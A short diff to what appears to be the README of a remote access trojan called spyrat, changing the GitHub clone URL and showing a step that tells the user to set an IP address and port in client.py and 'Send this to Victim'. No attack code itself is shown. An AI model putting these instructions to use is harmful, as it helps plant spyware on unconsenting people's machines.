@@ -13,7 +13,7 @@
  
 ## Download/Config/Usage:
     1? - Download the tool from github
-         git clone https://github.com/M4sc3r4n0/spyrat.git
+         git clone https://github.com/R3K1NG/spyrat.git
 
     2? - edit client.py :
          [!] Send this to Victim. After Changing Ip Address,port.in the line 75
